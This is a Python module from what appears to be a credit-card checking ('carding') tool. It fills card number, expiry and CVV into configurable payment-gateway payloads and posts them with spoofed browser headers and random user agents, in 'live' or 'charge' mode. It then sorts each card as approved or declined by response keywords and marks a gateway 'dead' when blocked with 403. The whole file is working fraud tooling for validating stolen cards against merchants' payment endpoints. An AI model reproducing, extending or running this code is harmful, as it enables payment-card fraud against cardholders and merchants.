import requests
import logging
import json
import time
import re

# --- FIXED: Import from the new utils.py file to prevent circular dependencies ---
try:
    from utils import random_user_agent
except ImportError:
    # Fallback for different execution contexts
    from ..utils import random_user_agent

logger = logging.getLogger(__name__)

def get_default_headers(user_agent, origin, referer):
    """Returns a dictionary of default headers to mimic a real browser."""
    headers = {
        'User-Agent': user_agent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Content-Type': 'application/json',
        'Origin': origin,
        'Referer': referer,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    return headers

def make_request_with_retry(session, method, url, max_retries=3, cancellation_event=None, **kwargs):
    """
    Makes an HTTP request with a retry mechanism for transient errors.
    It will NOT retry on 403 Forbidden errors.
    """
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            
            if response.status_code == 403:
                logger.warning(f"Request to {url} failed with status 403 (Forbidden). Not retrying.")
                return response, f"Request resulted in 403 Forbidden"

            response.raise_for_status()
            
            return response, None # Success
            
        except requests.exceptions.RequestException as e:
            last_exception = e
            if e.response is not None and 400 <= e.response.status_code < 500:
                 logger.error(f"Request to {url} failed with client error {e.response.status_code}. Not retrying.")
                 break
            
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message


def check_card_multi_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
    """
    A generic checker for multi-gate configurations.
    - mode: 'live' or 'charge'
    """
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'Operation cancelled', bin_info

    try:
        user_agent = random_user_agent()
        
        payment_headers = get_default_headers(
            user_agent=user_agent,
            origin=gate_config.get("origin", "https://example.com"),
            referer=gate_config.get("referer", "https://example.com/")
        )

        payment_url = gate_config.get('charge_url') if mode == 'charge' else gate_config.get('live_url')
        if not payment_url:
            return 'error', line, f"URL for '{mode}' mode not configured for gate '{gate_name}'", bin_info

        payload_template = gate_config.get('payload', {})
        payload_str = json.dumps(payload_template)
        payload_str = payload_str.replace("{cc}", cc).replace("{mes}", mes).replace("{ano}", ano).replace("{cvv}", cvv)
        payment_payload = json.loads(payload_str)

        payment_response, error = make_request_with_retry(
            session, 'post', payment_url, 
            json=payment_payload, headers=payment_headers, 
            timeout=25, cancellation_event=cancellation_event
        )

        if error or not payment_response:
            if "403 Forbidden" in str(error):
                return 'gate_dead', line, 'GATE_DIED: 403 Forbidden', bin_info
            return 'error', line, f"HTTP Error: {error or 'No response'}", bin_info

        response_text = payment_response.text
        
        success_keywords = gate_config.get('success_keywords', [])
        decline_keywords = gate_config.get('decline_keywords', [])
        
        if any(keyword in response_text for keyword in success_keywords):
            return 'live_success' if mode == 'live' else 'success', line, 'Card Approved', bin_info

        elif any(keyword in response_text for keyword in decline_keywords):
            return 'decline', line, 'Card Declined', bin_info
        
        return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate '{gate_name}' for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate '{gate_name}' System Error: {e}", bin_info
